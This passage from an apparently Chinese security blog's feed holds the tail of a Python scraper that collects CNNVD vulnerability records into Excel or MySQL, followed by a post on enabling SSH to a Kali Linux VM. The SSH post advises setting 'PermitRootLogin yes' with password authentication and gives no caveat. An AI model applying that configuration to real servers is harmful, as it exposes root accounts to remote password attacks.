vulnerabilities_cve_soup = BeautifulSoup(vulnerabilities_cve_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_cve = vulnerabilities_cve_soup.a.string</span><br><span class="line">        vulnerabilities_cve = vulnerabilities_cve.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_cve = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_cve)</span><br><span class="line">    </span><br><span class="line">    vulnerabilities_type_html = vulnerabilities_detainled_data_list[<span class="number">3</span>].decode()    <span class="comment">#漏洞类型</span></span><br><span class="line">    vulnerabilities_type_soup = BeautifulSoup(vulnerabilities_type_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_type = vulnerabilities_type_soup.a.string</span><br><span class="line">        vulnerabilities_type = vulnerabilities_type.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_type = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_type)</span><br><span class="line">    </span><br><span class="line">    vulnerabilities_time_html = vulnerabilities_detainled_data_list[<span class="number">4</span>].decode()    <span class="comment">#发布时间</span></span><br><span class="line">    vulnerabilities_time_soup = BeautifulSoup(vulnerabilities_time_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        vulnerabilities_time = vulnerabilities_time_soup.a.string</span><br><span class="line">        vulnerabilities_time = vulnerabilities_time.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_time = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_time)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_attack_html = vulnerabilities_detainled_data_list[<span class="number">5</span>].decode()    <span class="comment">#威胁类型</span></span><br><span class="line">    vulnerabilities_attack_soup = BeautifulSoup(vulnerabilities_attack_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        vulnerabilities_attack = vulnerabilities_attack_soup.a.string</span><br><span class="line">        vulnerabilities_attack = vulnerabilities_attack.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_attack = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_attack)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_update_html = vulnerabilities_detainled_data_list[<span class="number">6</span>].decode()    <span class="comment">#更新时间</span></span><br><span class="line">    vulnerabilities_update_soup = BeautifulSoup(vulnerabilities_update_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_update = vulnerabilities_update_soup.a.string</span><br><span class="line">        vulnerabilities_update = vulnerabilities_update.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_update = <span class="string">''</span>    </span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_update)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_firm_html = vulnerabilities_detainled_data_list[<span class="number">7</span>].decode()    <span class="comment">#厂商</span></span><br><span class="line">    vulnerabilities_firm_soup = BeautifulSoup(vulnerabilities_firm_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_firm = vulnerabilities_firm_soup.a.string</span><br><span class="line">        vulnerabilities_firm = vulnerabilities_firm.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_firm = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_firm)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_source_html = vulnerabilities_detainled_data_list[<span class="number">8</span>].decode()    <span class="comment">#漏洞来源</span></span><br><span class="line">    vulnerabilities_source_soup = BeautifulSoup(vulnerabilities_source_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_source = vulnerabilities_source_soup.a.string</span><br><span class="line">        vulnerabilities_source = vulnerabilities_source.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_source = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_source)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#添加漏洞简介详情</span></span><br><span class="line">    vulnerabilities_title_html = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj'</span>&#125;)    <span class="comment">#定义 漏洞简介 块的soup</span></span><br><span class="line">    vulnerabilities_title_html = vulnerabilities_title_html.decode()</span><br><span class="line">    vulnerabilities_title_soup2 = BeautifulSoup(vulnerabilities_title_html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_titles1 = vulnerabilities_title_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_titles2 = vulnerabilities_title_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_titles = vulnerabilities_titles1 + vulnerabilities_titles2</span><br><span class="line">        vulnerabilities_titles = vulnerabilities_titles.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_titles = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_titles)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#漏洞公告</span></span><br><span class="line">    vulnerabilities_notice_html = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)    <span class="comment">#定义 漏洞公告 块的soup</span></span><br><span class="line">    vulnerabilities_notice_html = vulnerabilities_notice_html.decode()</span><br><span class="line">    vulnerabilities_notice_soup2 = BeautifulSoup(vulnerabilities_notice_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_notice1 = vulnerabilities_notice_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_notice2 = vulnerabilities_notice_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_notice = vulnerabilities_notice1+vulnerabilities_notice2</span><br><span class="line">        vulnerabilities_notice = vulnerabilities_notice.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_notice = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#参考网址</span></span><br><span class="line">    vulnerabilities_reference_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">1</span>]    <span class="comment">#定义 参考网址 块的soup</span></span><br><span class="line">    vulnerabilities_reference_html = vulnerabilities_reference_html.decode()</span><br><span class="line">    vulnerabilities_reference_soup2 = BeautifulSoup(vulnerabilities_reference_html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_reference = vulnerabilities_reference_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_reference = vulnerabilities_reference.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">'链接:'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_reference = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_reference)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#受影响实体</span></span><br><span class="line">    vulnerabilities_effect_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">2</span>]    <span class="comment">#定义 受影响实体 块的soup</span></span><br><span class="line">    vulnerabilities_effect_html = vulnerabilities_effect_html.decode()</span><br><span class="line">    vulnerabilities_effect_soup2 = BeautifulSoup(vulnerabilities_effect_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_effect = vulnerabilities_effect.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name=<span class="string">'a'</span>)[<span class="number">0</span>].string</span><br><span class="line">            vulnerabilities_effect = vulnerabilities_effect.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            vulnerabilities_effect = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_effect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#补丁</span></span><br><span class="line">    vulnerabilities_patch_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">3</span>]    <span class="comment">#定义 补丁 块的soup</span></span><br><span class="line">    vulnerabilities_patch_html = vulnerabilities_patch_html.decode()</span><br><span class="line">    vulnerabilities_patch_soup2 = BeautifulSoup(vulnerabilities_patch_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_patch = vulnerabilities_patch_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_patch = vulnerabilities_patch.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_patch = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_patch)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息写入excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_excel</span><span class="params">(excel)</span>:</span></span><br><span class="line">    workbook = xlsxwriter.Workbook(<span class="string">'vulnerabilities_data.xlsx'</span>)</span><br><span class="line">    worksheet = workbook.add_worksheet()</span><br><span class="line"></span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    col = <span class="number">0</span></span><br><span class="line">    worksheet.write(row,<span class="number">0</span>,<span class="string">'漏洞名称'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">1</span>,<span class="string">'CNNVD编号'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">2</span>,<span class="string">'危害等级'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">3</span>,<span class="string">'CVE编号'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">4</span>,<span class="string">'漏洞类型'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">5</span>,<span class="string">'发布时间'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">6</span>,<span class="string">'攻击途径'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">7</span>,<span class="string">'更新时间'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">8</span>,<span class="string">'厂商'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">9</span>,<span class="string">'漏洞来源'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">10</span>,<span class="string">'漏洞简介'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">11</span>,<span class="string">'漏洞公告'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">12</span>,<span class="string">'参考链接'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">13</span>,<span class="string">'受影响实体'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">14</span>,<span class="string">'补丁'</span>)</span><br><span class="line"></span><br><span class="line">    row = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(excel)):</span><br><span class="line">        worksheet.write(row,col,excel[i][<span class="number">0</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">1</span>,excel[i][<span class="number">1</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">2</span>,excel[i][<span class="number">2</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">3</span>,excel[i][<span class="number">3</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">4</span>,excel[i][<span class="number">4</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">5</span>,excel[i][<span class="number">5</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">6</span>,excel[i][<span class="number">6</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">7</span>,excel[i][<span class="number">7</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">8</span>,excel[i][<span class="number">8</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">9</span>,excel[i][<span class="number">9</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">10</span>,excel[i][<span class="number">10</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">11</span>,excel[i][<span class="number">11</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">12</span>,excel[i][<span class="number">12</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">13</span>,excel[i][<span class="number">13</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">14</span>,excel[i][<span class="number">14</span>])</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    workbook.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息写入数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_mysql</span><span class="params">(excel)</span>:</span></span><br><span class="line">    db = pymysql.connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'xxxx'</span>,<span class="string">'spider'</span>,charset=<span class="string">'utf8'</span>)</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(excel)):</span><br><span class="line">        sql=<span class="string">"INSERT INTO cnnvd(vulnerabilities_name,cnnvd_num,vulnerabilities_rank,cve_num,vulnerabilities_type,release_time,attack_path,update_time,company,vulnerabilities_source,vulnerabilities_data,solution,reference,object,path) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);"</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(sql,(excel[i][<span class="number">0</span>],excel[i][<span class="number">1</span>],excel[i][<span class="number">2</span>],excel[i][<span class="number">3</span>],excel[i][<span class="number">4</span>],excel[i][<span class="number">5</span>],excel[i][<span class="number">6</span>],excel[i][<span class="number">7</span>],excel[i][<span class="number">8</span>],excel[i][<span class="number">9</span>],excel[i][<span class="number">10</span>],excel[i][<span class="number">11</span>],excel[i][<span class="number">12</span>],excel[i][<span class="number">13</span>],excel[i][<span class="number">14</span>]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'写入数据库失败'</span>)</span><br><span class="line">    print(<span class="string">'写入数据库完毕！！！'</span>)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#爬取代理ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#调用漏洞列表函数并获得漏洞链接列表</span></span><br><span class="line">    begin = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">global</span> vulnerabilities_lists</span><br><span class="line">    vulnerabilities_lists=[]</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    page_count = sys.argv[<span class="number">3</span>]</span><br><span class="line">    page_count = int(page_count) </span><br><span class="line">    start_time = sys.argv[<span class="number">1</span>]</span><br><span class="line">    end_time = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> j&lt;=page_count:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_url = <span class="string">'http://cnnvd.org.cn/web/vulnerability/queryLds.tag?pageno=%d&amp;repairLd='</span>%j</span><br><span class="line">            vulnerabilities_url_list(vulnerabilities_url,start_time,end_time)</span><br><span class="line">            print(<span class="string">"已完成爬行第%d页"</span>%j)</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'爬取失败，等待5秒后重新爬取。'</span>)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用漏洞信息函数并爬取漏洞信息</span></span><br><span class="line">    vulnerabilities_result_lists = []    </span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; len(vulnerabilities_lists):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_data(vulnerabilities_lists[a])</span><br><span class="line">            vulnerabilities_result_lists.append(vulnerabilities_result_list)</span><br><span class="line">            a+=<span class="number">1</span></span><br><span class="line">            print(<span class="string">"完成爬行第%d个漏洞信息"</span>%a)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'爬取失败，等待5秒后重新爬取。'</span>)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#漏洞信息写入excel</span></span><br><span class="line">    vulnerabilities_excel(vulnerabilities_result_lists)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#漏洞信息写入MySQL</span></span><br><span class="line">    <span class="comment">#vulnerabilities_mysql(vulnerabilities_result_lists)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#爬行结束</span></span><br><span class="line">    end = datetime.datetime.now()</span><br><span class="line">    total_time = end - begin</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'漏洞信息爬取结束'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'应该爬行漏洞数量： '</span>,len(vulnerabilities_lists))</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'爬行时间： '</span>,total_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>将代码保存为<code>CNNVD_crawl.py</code>,然后按<code>win + R</code> 输入<code>cmd</code>,切换到该文件的保存路径</p><h2 id="1-2-安装第三方模块"><a href="#1-2-安装第三方模块" class="headerlink" title="1.2 安装第三方模块"></a>1.2 安装第三方模块</h2><p>在运行的过程中需要第三方模块的支持，所以需要安装第三方模块，使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python - m pip install 第三方模块名称</span><br></pre></td></tr></table></figure><h1 id="0x02-使用教程"><a href="#0x02-使用教程" class="headerlink" title="0x02 使用教程"></a>0x02 使用教程</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cnnvd_crawl.py <span class="number">2019</span><span class="number">-08</span><span class="number">-26</span> <span class="number">2019</span><span class="number">-08</span><span class="number">-28</span> <span class="number">26</span></span><br></pre></td></tr></table></figure><p>参数说明：</p><p><code>cnnvd_crawl.py</code>: 为脚本文件</p><p><code>2019-08-26 2019-08-28</code>：需要爬取的时间范围（需要自行在CNNVD上查看对应日期范围的总页数），中间有空格</p><p><code>26</code> : 需要爬行的页数（需要自行在CNNVD上查看对应日期范围的总页数）</p><p>示例截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160303.png" class="lozad"></p><p>自动生成生成的Excel表格</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160315.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>在这里谈一下脚本的优势和劣势吧</p><p>脚本优势：可以指定日期范围漏洞的爬行，真心强大</p><p>脚本劣势：爬虫爬行时，会有部分遗漏信息，所以需要在爬行完成后再手动的添加；爬虫爬行的速度不是很快，不是多线程的.</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.cnblogs.com/kaiho/p/7804542.html" target="_blank" rel="noopener">https://www.cnblogs.com/kaiho/p/7804542.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh连接不上kali问题</title>
      <link href="/2019/08/27/ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Akali%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/27/ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Akali%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很多人在虚拟机中安装kali Linux，但是可能由于自己电脑配置的问题，导致使用起来非常的卡顿，所以想用xshell这样的远程终端工具来连接kali Linux。但是问题来了，怎么连接都连接不上，ip地址，用户名和密码什么的都配置正确，so，那可能就是配置的问题了。具体方法，请看下文。</p><a id="more"></a><h1 id="0x01-修改跟新源"><a href="#0x01-修改跟新源" class="headerlink" title="0x01 修改跟新源"></a>0x01 修改跟新源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list <span class="comment">#使用vim编辑器修改</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list <span class="comment">#使用可视化编辑器修改（好用）</span></span><br></pre></td></tr></table></figure><p>跟新源</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#清华大学</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line"><span class="comment">#浙大</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line"><span class="comment">#东软大学</span></span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#官方源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重庆大学</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>保存关闭，<code>vim</code>需要按<code>ESC</code>键，然后按<code>hift+ :</code>，输入<code>wq</code>，保存并退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h1 id="0x02-开启-ssh"><a href="#0x02-开启-ssh" class="headerlink" title="0x02 开启**ssh**"></a>0x02 <strong>开启**</strong>ssh**</h1><ol><li><p>修改sshd_config文件，命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></li><li><p>将<code>#PasswordAuthentication no</code>的注释去掉，并且将<code>NO</code>修改为<code>YES</code> (kali中默认是yes)</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190827233510.png" class="lozad"></p></li><li><p>将<code>PermitRootLogin without-password</code>修改为<code>PermitRootLogin yes</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190827233532.png" class="lozad"></p></li><li><p>启动ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure></li><li><p>如果还是不能链接，重启就可以了</p></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali Linux在安装vmtool时碰到的问题</title>
      <link href="/2019/08/27/%E5%9C%A8%E5%AE%89%E8%A3%85vmtool%E6%97%B6%E7%A2%B0%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/27/%E5%9C%A8%E5%AE%89%E8%A3%85vmtool%E6%97%B6%E7%A2%B0%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
